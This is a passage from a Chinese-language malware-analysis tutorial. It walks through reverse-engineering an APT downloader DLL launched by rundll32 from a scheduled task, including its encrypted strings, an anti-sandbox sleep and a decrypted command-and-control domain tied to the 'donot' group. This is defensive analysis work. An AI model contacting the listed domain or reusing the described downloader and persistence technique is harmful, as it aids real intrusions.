[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f5594e4f46799885.png)

且我们通过计划任务2可以得知，这里是通过rundll32.exe 调用了这个名为sqlmap.dll的calldll方法。<br>
目前vt(2020-06-24)上关于sqlmap.dll检出量为0：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01fa40a5926b3f2493.png)

我们可以对sqlmap.dll进行一个简单的分析。<br>
首先通过IDA加载sqlmap.dll，我们可以得到PDB信息：C:UsersspartanDocumentsVisual Studio 2010new projectsfrontendReleasetest.pdb

该pdb以前未出现过，而且结合test.pdb的字眼，该样本可能是攻击者开发的测试版本。

[![](https://p1.ssl.qhimg.com/t01af02996ddd248456.png)](https://p1.ssl.qhimg.com/t01af02996ddd248456.png)

calldll在导出表中

[![](https://p2.ssl.qhimg.com/t01010767fbd26bf22f.png)](https://p2.ssl.qhimg.com/t01010767fbd26bf22f.png)

calldll函数体很简单，就执行来一个call sub_10001280 我们跟进到该函数。

sub_10001280 首先是通过strcpy复制了一个看起来像是加密字符串的东西到变量<br>
bbLorkybbYngxkjbb]khbbmgvjgz4k~k

[![](https://p1.ssl.qhimg.com/t0134011000f87c3e9f.png)](https://p1.ssl.qhimg.com/t0134011000f87c3e9f.png)

该字符串暂时在Google上没有检出：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016d4f053fbc7485f2.png)

回到代码中，接下来程序会对上面的字符串进行解密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019aa759eb1f04e01c.png)

调试器中直接在calldll函数这里设置eip然后运行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a57c7bf973723ae4.png)

F7跟进进来

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0161a5915718bd5a68.png)

成功解密之后发现就是先前看到的路径

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f2afc5b0602a5360.png)

回到IDA中进行标注后继续往下看，成功解密之后，尝试打开文件对象，打开失败，则push16A26h然后执行slepp，sleep之后调用sub_10001000，这里的sleep应该是用于反沙箱的

[![](https://p1.ssl.qhimg.com/t01e3f440b8fc69f443.png)](https://p1.ssl.qhimg.com/t01e3f440b8fc69f443.png)

sub_10001000的内容非常明显，是解密URL并请求，所以很明显，sqlmap.dll是一个Download，比较直观的C伪代码显示：

[![](https://p2.ssl.qhimg.com/t017060e03a057966a9.png)](https://p2.ssl.qhimg.com/t017060e03a057966a9.png)

根据之前看到的信息，可以猜测这里是解密了域名之后，下载文件保存到之前看到大小为0kb的路径下，然后通过计划任务持久化执行。<br>
解密得到<br>
dnsresolve.live

[![](https://p0.ssl.qhimg.com/t018cbf01df82d5d541.png)](https://p0.ssl.qhimg.com/t018cbf01df82d5d541.png)

该地址已经跟donot关联了起来

[![](https://p5.ssl.qhimg.com/t01dce14d5d5077e15b.png)](https://p5.ssl.qhimg.com/t01dce14d5d5077e15b.png)

解析参数是

[![](https://p2.ssl.qhimg.com/t013f9c5962665e192e.png)](https://p2.ssl.qhimg.com/t013f9c5962665e192e.png)

但是目前这个地址404了，不知道是不是我请求姿势的问题

[![](https://p0.ssl.qhimg.com/t01639b16bcbf24c880.png)](https://p0.ssl.qhimg.com/t01639b16bcbf24c880.png)

于是查询了一下h6s87ehsci75sgats关键字：

[![](https://p4.ssl.qhimg.com/t01e924e76430353576.png)](https://p4.ssl.qhimg.com/t01e924e76430353576.png)

发现沙箱和vt也是404 ，这里后续就断了

[![](https://p4.ssl.qhimg.com/t01d82e73fb2b79f4ad.png)](https://p4.ssl.qhimg.com/t01d82e73fb2b79f4ad.png)

加上header也是404

[![](https://p5.ssl.qhimg.com/t01d8c4b72d1d42db00.png)](https://p5.ssl.qhimg.com/t01d8c4b72d1d42db00.png)

那么此次攻击分析到这就没有后续了，不知道是不是因为样本曝光，攻击者撤销了后续下载样本的原因。还是攻击者已经通过bat文件实现了本地持久化，所以故意暂时没有开放目标地址，防止分析人员，等热度过去了之后，再放开这个地址。如果是后面这种情况，可以考虑写脚本监视这个地址，看看过段时间是否有返回。



## 0x04 总结

在本小节中，我们对office恶意宏代码有了概要的了解并且通过两个简单的apt样本进行了分析，我们可以看到，宏代码在实际攻击中使用是非常广泛的，因为宏代码嵌入在文档中，是最容易和用户进行交互的部分，也往往是攻击者攻击中的第一部分。在本小节中我们分析了两个xls文档的宏代码，在下一小节我们将对带有混淆和反调试的宏代码进行调试和分析。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a2a9f6cd03d96a05.png)
